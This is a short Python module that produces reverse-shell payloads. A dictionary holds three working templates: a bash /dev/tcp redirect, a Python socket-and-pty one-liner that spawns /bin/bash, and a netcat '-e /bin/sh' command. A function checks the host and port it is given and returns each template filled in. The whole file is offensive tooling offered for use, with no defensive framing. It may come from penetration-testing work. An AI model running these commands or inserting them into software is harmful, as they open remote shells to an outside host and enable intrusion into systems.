import re
from typing import Dict

SHELL_TEMPLATES = {
    "bash": "bash -i >& /dev/tcp/{host}/{port} 0>&1",
    "python": (
        "python3 -c 'import os,pty,socket;"
        "s=socket.socket();s.connect((\"{host}\",{port}));"
        "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
    ),
    "nc": "nc -e /bin/sh {host} {port}",
}


def _validate_host(host: str) -> bool:
    """Validate IP address or hostname."""
    ip_pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    hostname_pattern = r"^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$"
    return bool(re.match(ip_pattern, host) or re.match(hostname_pattern, host))


def _validate_port(port: int) -> bool:
    """Validate port number."""
    return 1 <= port <= 65535


def generate_reverse_shell(host: str, port: int) -> Dict[str, str]:
    if not _validate_host(host):
        raise ValueError(f"Invalid host: {host}")
    if not _validate_port(port):
        raise ValueError(f"Invalid port: {port}")
    
    return {name: template.format(host=host, port=port) for name, template in SHELL_TEMPLATES.items()}
